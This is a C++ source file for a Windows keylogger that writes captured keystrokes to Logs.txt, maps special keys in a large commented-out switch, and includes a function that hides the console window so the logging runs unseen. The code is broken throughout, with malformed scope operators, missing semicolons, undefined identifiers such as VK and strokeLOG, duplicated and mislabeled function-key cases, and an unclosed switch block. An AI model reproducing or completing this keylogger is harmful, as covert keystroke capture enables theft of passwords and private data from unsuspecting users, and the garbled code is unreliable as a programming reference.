#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <conio.h>
using namespace std;
char x;
void StartingLogs()
{
  std:ofstream outf("Logs.txt");
  fstream logs;
  logs.open("Logs.txt", ios::app);
  if(logs.is_open())
  {
    x=_getch();
    logs<<x;
    logs.close();
  }
  if(logs.good()==false)
  {
    cout<<"Error";
  }
}
void StartingLogsSP(string user_input)
{
  fstream logs;
  logs.open("Logs.txt", ios:app);
  if(logs.is_open())
  {
    logs<<user_input
    logs.close
  }
  if(logs.good()==false)
  {
    cout<<"Error"
  }
}
bool SpecialKeyTrueOrFalse(){
switch (VK) {
case VK_TAB:
  cout << "#TAB";
  strokeLOG("#TAB");
  return true;
/*case VK_SPACE:
  cout << " ";
  strokeLOG(" ");
  return true;
case VK_RETURN:
  cout << "\n";
  strokeLOG("\n");
  return true;
case VK_SHIFT:
  cout << "#SHIFT#";
  strokeLOG("#SHIFT#");
  return true;
case VK_BACK:
  cout << "\b";
  strokeLOG("\b");
  return true;
case VK_RBUTTON:
  cout << "#R_CLICK#";
  strokeLOG("#R_CLICK#");
  return true;
case VK_CAPITAL:
  cout << "#CAPS_LOCK#";
  strokeLOG("#CAPS_LCOK");
  return true;
case VK_UP:
  cout << "#UP";
  strokeLOG("#UP_ARROW_KEY");
  return true;
case VK_DOWN:
  cout << "#DOWN";
  strokeLOG("#DOWN_ARROW_KEY");
  return true;
case VK_LEFT:
  cout << "[LEFT]";
  strokeLOG("[LEFT_ARROW_KEY]");
  return true;
case VK_RIGHT:
  cout << "[RIGHT]";
  strokeLOG("[RIGHT_ARROW_KEY]");
  return true;
case VK_CONTROL:
  cout << "[CONTROL]";
  strokeLOG("[CONTROL]");
  return true;
case VK_MENU:
  cout << "[ALT]";
  strokeLOG("[ALT]");
  return true;
case VK_F1:
  cout << "[F1]";
  return true;
case VK_F2:
  cout << "[F2]";
  return true;
case VK_F2:
  cout << "[F3]";
  return true;
case VK_F4:
  cout << "[F4]";
  return true;
case VK_F5:
  cout << "[F5]";
  return true;
case VK_F2:
  cout << "[F6]";
  return true;
case VK_F2:
  cout << "[F7]";
  return true;
case VK_F2:
  cout << "[F8]";
  return true;
case VK_F9:
  cout << "[F9]";
  return true;
case VK_F9:
  cout << "[F10]";
  return true;
case VK_F10:
  cout << "[F10]";
  return true;
case VK_F11:
  cout << "[F11]";
  return true;
case VK_F12:
  cout << "[F12]";
  return true;*/
default:
  return false;
}
void hideConsole()
{
  FreeConsole();
}
int main()
{
  StartingLogs();
  return 0;
}
